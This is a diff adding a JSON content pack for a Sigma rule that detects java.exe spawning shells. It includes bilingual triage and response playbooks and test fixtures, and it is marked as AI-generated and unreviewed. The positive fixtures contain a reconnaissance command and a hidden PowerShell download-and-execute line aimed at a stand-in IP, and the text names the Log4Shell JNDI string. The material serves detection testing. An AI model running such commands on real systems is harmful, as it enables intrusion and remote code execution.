@@ -1,0 +1,135 @@
+{
+  "rule": {
+    "id": "dff1e1cc-d3fd-47c8-bfc2-aeb878a754c0",
+    "title": "Shell Process Spawned by Java.EXE",
+    "level": "medium",
+    "status": "test",
+    "author": "Andreas Hunkeler (@Karneades), Nasreddine Bencherchali",
+    "path": "windows/process_creation/proc_creation_win_java_susp_child_process_2.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_java_susp_child_process_2.yml",
+    "license": "DRL-1.1",
+    "techniques": []
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un proceso java.exe lanzó un shell (cmd.exe, powershell.exe, pwsh.exe o bash.exe). Puede ser explotación de una aplicación Java, como Log4Shell, o una ejecución administrativa legítima.",
+      "what_it_detects": "Eventos de creación de procesos en Windows donde ParentImage termina en \\java.exe e Image termina en \\cmd.exe, \\powershell.exe, \\pwsh.exe o \\bash.exe. Se excluyen los casos donde ParentImage y CommandLine contienen 'build' a la vez, que suelen ser agentes de CI.",
+      "why_it_matters": "Los servidores Java que están expuestos (Tomcat, Jenkins, Elasticsearch, aplicaciones internas) pueden caer por inyección o deserialización. Si eso pasa, el atacante obtiene un shell y puede ejecutar comandos, persistir y escalar privilegios. Corresponde a acceso inicial mediante explotación de una aplicación pública (T1190) y a la ejecución de intérpretes de comandos (T1059).",
+      "triage_steps": [
+        "Lea CommandLine del shell. Si ve whoami, net user, descargas, IEX, -enc, certutil o conexiones salientes, súbala de inmediato.",
+        "Revise ParentImage y la línea de comandos de java.exe para saber qué aplicación es (Tomcat, Jenkins, etc.) y con qué cuenta se ejecuta.",
+        "Busque procesos hijos y nietos del shell en el mismo host en una ventana de +/- 15 minutos: archivos nuevos, ejecutables descargados, tareas programadas, servicios.",
+        "Busque conexiones de red del host y del proceso java.exe. Ponga atención a IP externas, LDAP/RMI salientes y descargas HTTP justo antes del shell.",
+        "Revise los logs de la aplicación o del proxy inverso en ese horario. Busque cadenas como ${jndi: en headers, user agent o parámetros, y anote la IP de origen.",
+        "Busque alertas anteriores del mismo host, de la misma cuenta de servicio y de la misma IP de origen.",
+        "Confirme con el dueño de la aplicación si lanzar shells es parte del funcionamiento normal (scripts, plugins, tareas de mantenimiento)."
+      ],
+      "false_positives": [
+        "Aplicaciones Java que llaman a cmd.exe o PowerShell para tareas legítimas como scripts de mantenimiento, reportes o integraciones.",
+        "Uso propio de la empresa: herramientas internas, IDEs o lanzadores Java que ejecutan comandos del sistema.",
+        "Agentes de CI/CD cuya ruta o línea de comandos no contiene 'build', por lo que el filtro no los excluye.",
+        "Instaladores o actualizadores basados en Java."
+      ],
+      "response_steps": [
+        "Verifique primero: confirme con el dueño de la aplicación y con la evidencia del CommandLine antes de actuar.",
+        "Si hay indicios de explotación, aísle el endpoint desde el EDR y conserve la memoria, los logs de la aplicación y los artefactos creados.",
+        "Bloquee la IP de origen y los dominios de descarga. Revise si otros hosts tuvieron conexiones hacia esos destinos.",
+        "Corrija la aplicación vulnerable aplicando el parche o la mitigación del proveedor. Elimine la persistencia identificada y rote las credenciales de la cuenta de servicio.",
+        "Recupere el servicio desde una base limpia y monitoree el host para detectar shells nuevos lanzados por java.exe.",
+        "Si es legítimo, documente y cree una excepción acotada por ruta y CommandLine."
+      ],
+      "severity_rationale": "El nivel medio es adecuado: el patrón es un indicador fuerte de explotación, pero hay aplicaciones Java legítimas que lanzan shells, así que hace falta contexto para confirmarlo."
+    },
+    "en": {
+      "summary": "A java.exe process spawned a shell (cmd.exe, powershell.exe, pwsh.exe or bash.exe). This may mean a Java application was exploited, for example via Log4Shell, or it may be legitimate automation.",
+      "what_it_detects": "Windows process creation events where ParentImage ends with \\java.exe and Image ends with \\cmd.exe, \\powershell.exe, \\pwsh.exe or \\bash.exe. Events where both ParentImage and CommandLine contain 'build' are excluded, since those are usually CI agents.",
+      "why_it_matters": "Exposed Java servers such as Tomcat, Jenkins, Elasticsearch or in-house apps can be compromised through injection or deserialization. An attacker who succeeds gets a shell to run commands, persist and escalate. This maps to exploiting a public-facing application (T1190) and using command interpreters (T1059).",
+      "triage_steps": [
+        "Read the shell's CommandLine. Escalate right away if you see whoami, net user, downloads, IEX, -enc, certutil or outbound connections.",
+        "Check ParentImage and the java.exe command line to identify the application (Tomcat, Jenkins, etc.) and the account running it.",
+        "Look for child and grandchild processes of the shell on the same host within +/- 15 minutes: dropped files, new binaries, scheduled tasks, services.",
+        "Check network connections from the host and from java.exe, especially outbound LDAP/RMI, external IPs or HTTP downloads just before the shell started.",
+        "Review application or reverse proxy logs for that time window. Look for strings like ${jndi: in headers, user agent or parameters, and note the source IP.",
+        "Search for earlier alerts on the same host, service account and source IP.",
+        "Ask the application owner whether spawning shells is expected behavior (scripts, plugins, maintenance jobs)."
+      ],
+      "false_positives": [
+        "Java applications that call cmd.exe or PowerShell for legitimate jobs such as maintenance scripts, reporting or integrations.",
+        "Company-specific use: internal tools, IDEs or Java launchers that run system commands.",
+        "CI/CD agents whose path or command line does not contain 'build', so the filter does not exclude them.",
+        "Java-based installers or updaters."
+      ],
+      "response_steps": [
+        "Verify first: check with the application owner and review the CommandLine evidence before you act.",
+        "If you see signs of exploitation, isolate the endpoint through EDR and preserve memory, application logs and any dropped artifacts.",
+        "Block the source IP and download domains, then check whether other hosts contacted them.",
+        "Patch or mitigate the vulnerable application, remove the persistence you found and rotate the service account credentials.",
+        "Restore from a clean baseline and keep watching the host for new shells spawned by java.exe.",
+        "If the activity is legitimate, document it and add a narrow exclusion by path and CommandLine."
+      ],
+      "severity_rationale": "Medium fits because the pattern strongly suggests exploitation, but some legitimate Java applications spawn shells, so you need context to confirm it."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Tomcat's java.exe spawns cmd.exe to run reconnaissance commands, a typical sign of web application exploitation.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WEB-APP-03.andes.example.com",
+          "User": "NT AUTHORITY\\LOCAL SERVICE",
+          "ParentImage": "C:\\Program Files\\Apache Software Foundation\\Tomcat 9.0\\jre\\bin\\java.exe",
+          "ParentCommandLine": "\"C:\\Program Files\\Apache Software Foundation\\Tomcat 9.0\\jre\\bin\\java.exe\" -Dcatalina.home=\"C:\\Program Files\\Apache Software Foundation\\Tomcat 9.0\" org.apache.catalina.startup.Bootstrap start",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "cmd.exe /c whoami && net user",
+          "ProcessId": 4812
+        }
+      },
+      {
+        "description": "java.exe from a path containing 'build' spawns PowerShell, but the CommandLine has no 'build', so the filter does not apply and the event matches.",
+        "event": {
+          "EventID": 1,
+          "Computer": "CI-AGENT-02.andes.example.com",
+          "User": "ANDES\\svc_ci",
+          "ParentImage": "C:\\build-agent\\jdk\\bin\\java.exe",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.10/a.ps1')\"",
+          "ProcessId": 7720
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "CI agent: ParentImage and CommandLine both contain 'build', so filter_main_build excludes the event.",
+        "event": {
+          "EventID": 1,
+          "Computer": "CI-AGENT-02.andes.example.com",
+          "User": "ANDES\\svc_ci",
+          "ParentImage": "C:\\build-agent\\jdk\\bin\\java.exe",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "cmd.exe /c gradlew.bat clean build --no-daemon",
+          "ProcessId": 6604
+        }
+      },
+      {
+        "description": "java.exe spawns conhost.exe, which is not one of the listed shells.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Program Files\\Java\\jre1.8.0_301\\bin\\java.exe",
+          "Image": "C:\\Windows\\System32\\conhost.exe",
+          "CommandLine": "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1",
+          "ProcessId": 3312
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
